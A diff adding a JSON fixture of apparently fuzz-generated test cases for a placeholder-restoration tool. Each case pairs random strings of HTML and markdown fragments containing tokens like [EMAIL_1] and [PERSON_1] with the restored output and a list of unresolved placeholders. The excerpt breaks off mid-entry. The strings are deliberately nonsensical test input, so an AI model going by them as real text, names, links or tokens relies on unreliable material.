+   "text": "www.'https://<img src='<https:xé\n\n[EMAIL_1]<[URL_WITH_TOKEN_1]<img src='>",
+   "restored": "www.'https://<img src='<https:xé\n\n[EMAIL_1]<[URL_WITH_TOKEN_1]<img src='>",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]",
+   "restored": "anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON<https:[LITERAL_1]['.[PERSON_1][PERSON_1]![a][person-1]<a href=//EMAIL_1.",
+   "restored": "PERSON<https:[LITERAL_1]['.[PERSON_1][PERSON_1]![a][person-1]<a href=//EMAIL_1.",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]:) ",
+   "restored": "[1]:) ",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]![a]=]]([EMAIL_1]",
+   "restored": "https://intranet.example/doc?token=abc![a]=]]([EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "2<img src='(é![a][[EMAIL_1] [EMAIL_2]2[EMAIL_2]",
+   "restored": "2<img src='(é![a][[EMAIL_1] [EMAIL_2]2[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\n[1]:[LITERAL_1]xé",
+   "restored": "\n[1]:[LITERAL_1]xé",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2x  [URL_WITH_TOKEN_1]éhttps://é](]",
+   "restored": "PERSON 2x  https://intranet.example/doc?token=abcéhttps://é](]",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]](<https:  PERSONé<a href=  <\n\n",
+   "restored": "Anna Petrova](<https:  PERSONé<a href=  <\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "[person-1])<[PERSON_2][PERSON_2]PERSON_1\"",
+   "restored": "Anna Petrova)<Karen ExampleKaren ExamplePERSON_1\"",
+   "unresolved": []
+  },
+  {
+   "text": "EMAIL_1_xé[URL_WITH_TOKEN_1]PERSON_1![a]\n[LITERAL_1]\"EMAIL_1<\"",
+   "restored": "EMAIL_1_xéhttps://intranet.example/doc?token=abcPERSON_1![a]\n[PERSON_1]\"anna@example.org<\"",
+   "unresolved": []
+  },
+  {
+   "text": "[2![a]<a href=\n\n\"\n\n//",
+   "restored": "[2![a]<a href=\n\n\"\n\n//",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON 2<a href=<a href='é=\"_www.",
+   "restored": "Karen Example<a href=<a href='é=\"_www.",
+   "unresolved": []
+  },
+  {
+   "text": "_'![a]é[EMAIL_2]\"(<https:<img src='[LITERAL_1].[EMAIL_1]PERSON_1=",
+   "restored": "_'![a]é[EMAIL_2]\"(<https:<img src='[PERSON_1].anna@example.orgPERSON_1=",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "2=]PERSONPERSON 2=<img src='EMAIL_1[PERSON_1]PERSON_1(x",
+   "restored": "2=]PERSONPERSON 2=<img src='EMAIL_1[PERSON_1]PERSON_1(x",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2_]>[URL_WITH_TOKEN_1][EMAIL_1]![a]PERSON_1  )",
+   "restored": "PERSON 2_]>https://intranet.example/doc?token=abc[EMAIL_1]![a]PERSON_1  )",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ")PERSON_1",
+   "restored": ")Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "EMAIL_1[PERSON_1]<[LITERAL_1]<img src='2//",
+   "restored": "EMAIL_1Anna Petrova<[PERSON_1]<img src='2//",
+   "unresolved": []
+  },
+  {
+   "text": "<img src=')\nPERSON_1<https:[PERSON_2]\n\nPERSON.PERSON 2éPERSON[PERSON_1",
+   "restored": "<img src=')\nPERSON_1<https:[PERSON_2]\n\nPERSON.PERSON 2éPERSON[PERSON_1",
+   "unresolved": [
+    [
+     "PERSON_1",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_2]\nPERSON= [person-1][PERSON_1]>.[URL_WITH_TOKEN_1]x\n2EMAIL_1",
+   "restored": "[EMAIL_2]\nPERSON= Anna PetrovaAnna Petrova>.https://intranet.example/doc?token=abcx\n2EMAIL_1",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "x![a]",
+   "restored": "x![a]",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]\n\n[PERSON_1]",
+   "restored": "Anna Petrova\n\nAnna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_2]",
+   "restored": "[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]![a][EMAIL_2][LITERAL_1]x[PERSON_2]www.PERSONhttps:// )PERSON 2<[URL_WITH_TOKEN_1]",
+   "restored": "anna@example.org![a][EMAIL_2][PERSON_1]xKaren Examplewww.PERSONhttps:// )Karen Example<https://intranet.example/doc?token=abc",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]<a href=2é  //PERSON 2PERSON_1[PERSON_1]PERSON 2[PERSON_1][EMAIL_1]",
+   "restored": "anna@example.org<a href=2é  //PERSON 2PERSON_1Anna PetrovaPERSON 2Anna Petrovaanna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "<img src='<img src='](éPERSON 2<https:<",
+   "restored": "<img src='<img src='](éPERSON 2<https:<",
+   "unresolved": []
+  },
+  {
+   "text": " x]([URL_WITH_TOKEN_1][EMAIL_2]<](\nx>",
+   "restored": " x]([URL_WITH_TOKEN_1][EMAIL_2]<](\nx>",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": " www.PERSON\"<a href=www.PERSON 2\"[PERSON_1][URL_WITH_TOKEN_1]<img src='.\n\n",
+   "restored": " www.PERSON\"<a href=www.PERSON 2\"Anna Petrovahttps://intranet.example/doc?token=abc<img src='.\n\n",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ">>>[1]:",
+   "restored": ">>>[1]:",
+   "unresolved": []
+  },
+  {
+   "text": " <a href=[PERSON_1]<https://www.\n\n](.PERSON_1<a href=[URL_WITH_TOKEN_1]PERSON",
+   "restored": " <a href=[PERSON_1]<https://www.\n\n](.PERSON_1<a href=[URL_WITH_TOKEN_1]PERSON",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON_1",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.2é",
+   "restored": "www.2é",
+   "unresolved": []
+  },
+  {
+   "text": "][EMAIL_1]]2é>",
+   "restored": "]anna@example.org]2é>",
+   "unresolved": []
+  },
+  {
+   "text": "[1]:<img src='PERSON 2=",
+   "restored": "[1]:<img src='PERSON 2=",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![a]//.[PERSON_1]>  ][EMAIL_1]",
+   "restored": "![a]//.[PERSON_1]>  ]anna@example.org",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'[person-1][1]:=.[//[<https:",
+   "restored": "'Anna Petrova[1]:=.[//[<https:",
+   "unresolved": []
+  },
+  {
+   "text": "_.((![a]([EMAIL_1])",
+   "restored": "_.((![a]([EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<a href=<PERSONPERSON'=[[URL_WITH_TOKEN_1]https://PERSON_1é<EMAIL_1",
+   "restored": "<a href=<PERSONPERSON'=[[URL_WITH_TOKEN_1]https://PERSON_1é<EMAIL_1",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "  [EMAIL_1][URL_WITH_TOKEN_1]<https:[PERSON_2]'",
+   "restored": "  anna@example.orghttps://intranet.example/doc?token=abc<https:[PERSON_2]'",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[[PERSON_2]EMAIL_1PERSON_1![a]",
+   "restored": "[Karen ExampleEMAIL_1PERSON_1![a]",
+   "unresolved": []
+  },
+  {
+   "text": "PERSONé.PERSON![a]//www.\n\nEMAIL_1 .[LITERAL_1]//PERSON_1",
+   "restored": "PERSONé.PERSON![a]//www.\n\nanna@example.org .[PERSON_1]//PERSON_1",
+   "unresolved": [
+    [
+     "PERSON_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "()>[EMAIL_1][PERSON_2]PERSON 2",
+   "restored": "()>anna@example.orgKaren ExamplePERSON 2",
+   "unresolved": []
+  },
+  {
+   "text": "2",
+   "restored": "2",
+   "unresolved": []
+  },
+  {
+   "text": "  é[person-1]=[EMAIL_2][EMAIL_1]",
+   "restored": "  éAnna Petrova=[EMAIL_2]anna@example.org",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "<https:PERSON[1]:[EMAIL_1]_",
+   "restored": "<https:PERSON[1]:[EMAIL_1]_",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ") ](<https://[1]:)",
+   "restored": ") ](<https://[1]:)",
+   "unresolved": []
+  },
+  {
+   "text": "//",
+   "restored": "//",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON 22[PERSON_2]PERSON 2//_",
+   "restored": "PERSON 22Karen ExamplePERSON 2//_",
+   "unresolved": []
+  },
+  {
+   "text": "xPERSON 2EMAIL_1[URL_WITH_TOKEN_1]<https:[PERSON_1](<img src='.. EMAIL_1",
+   "restored": "xPERSON 2EMAIL_1https://intranet.example/doc?token=abc<https:[PERSON_1](<img src='.. EMAIL_1",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<https:<//>[EMAIL_2]<x>",
+   "restored": "<https:<//>[EMAIL_2]<x>",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": " https://[URL_WITH_TOKEN_1]",
+   "restored": " https://[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_1]  (PERSON_1]([1]:[person-1]<[LITERAL_1] EMAIL_1",
+   "restored": "Anna Petrova  (PERSON_1]([1]:[person-1]<[LITERAL_1] EMAIL_1",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_2][person-1] \"<https:[1]:x",
+   "restored": "Karen ExampleAnna Petrova \"<https:[1]:x",
+   "unresolved": []
+  },
+  {
+   "text": "<[URL_WITH_TOKEN_1]",
+   "restored": "<https://intranet.example/doc?token=abc",
+   "unresolved": []
+  },
+  {
+   "text": "[1]:PERSON 2) 2[URL_WITH_TOKEN_1]",
+   "restored": "[1]:PERSON 2) 2https://intranet.example/doc?token=abc",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]www.\n\nhttps://[URL_WITH_TOKEN_1][PERSON_2]www.",
+   "restored": "https://intranet.example/doc?token=abcwww.\n\nhttps://[URL_WITH_TOKEN_1][PERSON_2]www.",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<a href=\"](//éEMAIL_1<https:  x[EMAIL_2]",
+   "restored": "<a href=\"](//éEMAIL_1<https:  x[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "_PERSON 2![a]",
+   "restored": "_PERSON 2![a]",
+   "unresolved": []
+  },
+  {
+   "text": "x<a href=[EMAIL_2]//(<\n\n//https://",
+   "restored": "x<a href=[EMAIL_2]//(<\n\n//https://",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1><a href=\n",
+   "restored": "anna@example.org><a href=\n",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON 2<a href=[URL_WITH_TOKEN_1]",
+   "restored": "Karen Example<a href=[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_2] _\"_[LITERAL_1] [PERSON_1][<a href=)",
+   "restored": "Karen Example _\"_[PERSON_1] Anna Petrova[<a href=)",
+   "unresolved": []
+  },
+  {
+   "text": "\n\nPERSON_1\n![a]www.PERSON",
+   "restored": "\n\nAnna Petrova\n![a]www.PERSON",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1])[",
+   "restored": "[PERSON_1])[",
+   "unresolved": []
+  },
+  {
+   "text": "[1]:)([EMAIL_1][EMAIL_1]éwww.)![a][LITERAL_1](.<img src='",
+   "restored": "[1]:)([EMAIL_1][EMAIL_1]éwww.)![a][LITERAL_1](.<img src='",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_1][person-1][\n",
+   "restored": "Anna PetrovaAnna Petrova[\n",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON 2['\"<a href=é[EMAIL_1][PERSON_1]\nx[LITERAL_1]www.https://)",
+   "restored": "PERSON 2['\"<a href=é[EMAIL_1][PERSON_1]\nx[PERSON_1]www.https://)",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<PERSON_1](<PERSON[PERSON_1]'[ [",
+   "restored": "<PERSON_1](<PERSON[PERSON_1]'[ [",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_2]'",
+   "restored": "[EMAIL_2]'",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "https://<https:>PERSONPERSON 2<a href=EMAIL_1é _[PERSON_2][",
+   "restored": "https://<https:>PERSONPERSON 2<a href=EMAIL_1é _Karen Example[",
+   "unresolved": []
+  },
+  {
+   "text": "][LITERAL_1][PERSON_2]https://[EMAIL_1][1]:)](EMAIL_1<img src='//2[PERSON_2]",
+   "restored": "][PERSON_1]Karen Examplehttps://[EMAIL_1][1]:)](EMAIL_1<img src='//2[PERSON_2]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1",
+   "restored": "anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "(//[PERSON_2]PERSON  [https:// EMAIL_1'EMAIL_1)",
+   "restored": "(//[PERSON_2]PERSON  [https:// anna@example.org'anna@example.org)",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.",
+   "restored": "www.",
+   "unresolved": []
+  },
+  {
+   "text": "  é",
+   "restored": "  é",
+   "unresolved": []
+  },
+  {
+   "text": "_www.[EMAIL_2][EMAIL_2][EMAIL_2]=[LITERAL_1]].[1]:",
+   "restored": "_www.[EMAIL_2][EMAIL_2][EMAIL_2]=[LITERAL_1]].[1]:",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]:[URL_WITH_TOKEN_1]PERSON  =]([PERSON_2]>\n[PERSON_1=PERSON 2<",
+   "restored": "[1]:[URL_WITH_TOKEN_1]PERSON  =]([PERSON_2]>\n[PERSON_1=PERSON 2<",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ],
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "=https://\"\n\nPERSON<https:",
+   "restored": "=https://\"\n\nPERSON<https:",
+   "unresolved": []
+  },
+  {
+   "text": "=2PERSON 2<https:[[URL_WITH_TOKEN_1]'https://\n\n[PERSON_1]<EMAIL_1[)",
+   "restored": "=2PERSON 2<https:[[URL_WITH_TOKEN_1]'https://\n\nAnna Petrova<EMAIL_1[)",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<https:\n\n",
+   "restored": "<https:\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "_[PERSON_2][1]:[LITERAL_1]",
+   "restored": "_Karen Example[1]:[PERSON_1]",
+   "unresolved": []
+  },
+  {
+   "text": "=  PERSON_1PERSON_1PERSON_1www.www.",
+   "restored": "=  PERSON_1PERSON_1PERSON_1www.www.",
+   "unresolved": []
+  },
+  {
+   "text": "]PERSON_1EMAIL_1//[EMAIL_2][[PERSON_1]\n\nhttps://PERSON_1<a href=",
+   "restored": "]PERSON_1EMAIL_1//[EMAIL_2][[PERSON_1]\n\nhttps://PERSON_1<a href=",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img src=''",
+   "restored": "<img src=''",
+   "unresolved": []
+  },
+  {
+   "text": "]([EMAIL_2]PERSON 2_www.[EMAIL_1]  .][URL_WITH_TOKEN_1] ",
+   "restored": "]([EMAIL_2]PERSON 2_www.[EMAIL_1]  .][URL_WITH_TOKEN_1] ",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "_[LITERAL_1]",
+   "restored": "_[PERSON_1]",
+   "unresolved": []
+  },
+  {
+   "text": "\nPERSON<a href=www.https://",
+   "restored": "\nPERSON<a href=www.https://",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_1]]<a href=  PERSON[1]:>(2<  2",
+   "restored": "anna@example.org]<a href=  PERSON[1]:>(2<  2",
+   "unresolved": []
+  },
+  {
+   "text": "xx<img src='[PERSON_2]https://",
+   "restored": "xx<img src='[PERSON_2]https://",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]:(_]>.",
+   "restored": "[1]:(_]>.",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]'](https://<https:2<https:",
+   "restored": "Anna Petrova'](https://<https:2<https:",
+   "unresolved": []
+  },
+  {
+   "text": "www.<a href=![a]<a href=PERSON 2[PERSON_2]](2",
+   "restored": "www.<a href=![a]<a href=PERSON 2Karen Example](2",
+   "unresolved": []
+  },
+  {
+   "text": "' ",
+   "restored": "' ",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON 2[> 'EMAIL_1[[1]:[URL_WITH_TOKEN_1]\n\"",
+   "restored": "PERSON 2[> 'EMAIL_1[[1]:https://intranet.example/doc?token=abc\n\"",
+   "unresolved": []
+  },
+  {
+   "text": "'[LITERAL_1](www.[EMAIL_1xwww.[LITERAL_1]\nEMAIL_1",
+   "restored": "'[PERSON_1](www.[EMAIL_1xwww.[LITERAL_1]\nEMAIL_1",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\n",
+   "restored": "\n",
+   "unresolved": []
+  },
+  {
+   "text": "2.[EMAIL_2]é=PERSON[URL_WITH_TOKEN_1]\nwww.[EMAIL_2]>   ",
+   "restored": "2.[EMAIL_2]é=PERSONhttps://intranet.example/doc?token=abc\nwww.[EMAIL_2]>   ",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "'<a href='=[",
+   "restored": "'<a href='=[",
+   "unresolved": []
+  },
+  {
+   "text": "><https:[PERSON_1]é> <img src=')]",
+   "restored": "><https:[PERSON_1]é> <img src=')]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]\n\nPERSON>.",
+   "restored": "https://intranet.example/doc?token=abc\n\nPERSON>.",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_1]\"<https:https://",
+   "restored": "anna@example.org\"<https:https://",
+   "unresolved": []
+  },
+  {
+   "text": "![a]\n\n[PERSON_1][PERSON_2]PERSON 2//",
+   "restored": "![a]\n\nAnna PetrovaKaren ExamplePERSON 2//",
+   "unresolved": []
+  },
+  {
+   "text": "é<img src=']<img src=']\n\n[[\n\n>",
+   "restored": "é<img src=']<img src=']\n\n[[\n\n>",
+   "unresolved": []
+  },
+  {
+   "text": "'PERSON_1' [PERSON_1][person-1][[1]:",
+   "restored": "'Anna Petrova' Anna PetrovaAnna Petrova[[1]:",
+   "unresolved": []
+  },
+  {
+   "text": "\n<",
+   "restored": "\n<",
+   "unresolved": []
+  },
+  {
+   "text": "=2PERSON[URL_WITH_TOKEN_1](\né= ",
+   "restored": "=2PERSONhttps://intranet.example/doc?token=abc(\né= ",
+   "unresolved": []
+  },
+  {
+   "text": ".\"[[EMAIL_1]](<<https:<[person-1]<img src='_)[EMAIL_2]",
+   "restored": ".\"[anna@example.org](<<https:<[person-1]<img src='_)[EMAIL_2]",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<a href=\"_\n]([<a href=_![a]_(",
+   "restored": "<a href=\"_\n]([<a href=_![a]_(",
+   "unresolved": []
+  },
+  {
+   "text": ")PERSON 2PERSONEMAIL_1'PERSONPERSON_1",
+   "restored": ")PERSON 2PERSONEMAIL_1'PERSONPERSON_1",
+   "unresolved": []
+  },
+  {
+   "text": "\n[PERSON_1][PERSON_1]<img src='2[PERSON_1]<img src='=EMAIL_1.[PERSON_1][PERSON_2]",
+   "restored": "\nAnna PetrovaAnna Petrova<img src='2[PERSON_1]<img src='=EMAIL_1.[PERSON_1][PERSON_2]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ")é2PERSON",
+   "restored": ")é2PERSON",
+   "unresolved": []
+  },
+  {
+   "text": "]_[URL_WITH_TOKEN_1]PERSON(",
+   "restored": "]_https://intranet.example/doc?token=abcPERSON(",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_2][URL_WITH_TOKEN_1]]([_EMAIL_1[PERSON_2]",
+   "restored": "[EMAIL_2]https://intranet.example/doc?token=abc]([_EMAIL_1[PERSON_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[person-1]](",
+   "restored": "Anna Petrova](",
+   "unresolved": []
+  },
+  {
+   "text": "é  \n\nPERSON 2[PERSON_1].<https:[URL_WITH_TOKEN_1]https://",
+   "restored": "é  \n\nPERSON 2Anna Petrova.<https:[URL_WITH_TOKEN_1]https://",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.](PERSON_1www.EMAIL_1.",
+   "restored": "www.](PERSON_1www.EMAIL_1.",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'(",
+   "restored": "'(",
+   "unresolved": []
+  },
+  {
+   "text": ">[PERSON_2]PERSON 2[1]:=.PERSON_1 ",
+   "restored": ">Karen ExamplePERSON 2[1]:=.Anna Petrova ",
+   "unresolved": []
+  },
+  {
+   "text": "https://",
+   "restored": "https://",
+   "unresolved": []
+  },
+  {
+   "text": "[1]:PERSON_1](.",
+   "restored": "[1]:PERSON_1](.",
+   "unresolved": []
+  },
+  {
+   "text": ")<https:[PERSON_1]  <img src='\n//é[person-1]https://>.[1]:\n",
+   "restored": ")<https:[PERSON_1]  <img src='\n//é[person-1]https://>.[1]:\n",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "=é[PERSON_2]https://[EMAIL_1]",
+   "restored": "=éKaren Examplehttps://[EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "]('>",
+   "restored": "]('>",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]<a href==",
+   "restored": "Anna Petrova<a href==",
+   "unresolved": []
+  },
+  {
+   "text": "<[EMAIL_2]\"]>\"=[person-1][EMAIL_2]",
+   "restored": "<[EMAIL_2]\"]>\"=Anna Petrova[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "'2https://>(  <a href=",
+   "restored": "'2https://>(  <a href=",
+   "unresolved": []
+  },
+  {
+   "text": "https://\n\nPERSON_1www.[PERSON_2]\"",
+   "restored": "https://\n\nPERSON_1www.Karen Example\"",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]https://[LITERAL_1][EMAIL_1](www.][LITERAL_1]2   https://](",
+   "restored": "https://intranet.example/doc?token=abchttps://[LITERAL_1][EMAIL_1](www.][LITERAL_1]2   https://](",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'![a]=>.![a]",
+   "restored": "'![a]=>.![a]",
+   "unresolved": []
+  },
+  {
+   "text": "x_![a][1]: ",
+   "restored": "x_![a][1]: ",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1]// .<]https://=_![a][LITERAL_1]",
+   "restored": "[PERSON_1]// .<]https://=_![a][LITERAL_1]",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_2]_[EMAIL_1]]www.>[PERSON_2]PERSON[URL_WITH_TOKEN_1]<img src='[PERSON_1]>[EMAIL_1])",
+   "restored": "[EMAIL_2]_anna@example.org]www.>[PERSON_2]PERSON[URL_WITH_TOKEN_1]<img src='[PERSON_1]>[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]:<https:(EMAIL_1[person-1]2<_<img src='([person-1]<img src='[EMAIL_1]",
+   "restored": "[1]:<https:(EMAIL_1[person-1]2<_<img src='([person-1]<img src='[EMAIL_1]",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<a href=[LITERAL_1]=<a href=",
+   "restored": "<a href=[LITERAL_1]=<a href=",
+   "unresolved": [
+    [
